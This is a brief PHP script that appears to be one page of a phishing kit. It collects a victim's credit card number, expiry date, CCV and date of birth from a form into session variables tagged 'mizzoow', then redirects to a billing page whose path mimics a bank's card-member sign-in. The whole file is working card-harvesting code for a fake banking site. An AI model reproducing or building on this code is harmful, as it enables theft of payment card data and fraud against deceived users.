<?php
session_start();
$_SESSION['mizzoow_CCN'] = $_POST['ccnumb'];
$_SESSION['mizzoow_exm']  = $_POST['expirMonth'];
$_SESSION['mizzoow_exy'] = $_POST['expiryear'];
$_SESSION['mizzoow_ccv']  = $_POST['CCV'];
$_SESSION['mizzoow_day'] = $_POST['day'];
$_SESSION['mizzoow_mon']  = $_POST['month'];
$_SESSION['mizzoow_yer']  = $_POST['year'];

header("Location: billinginformation.php?section=cardmembersvcs/loginlogout/app/signin");

?>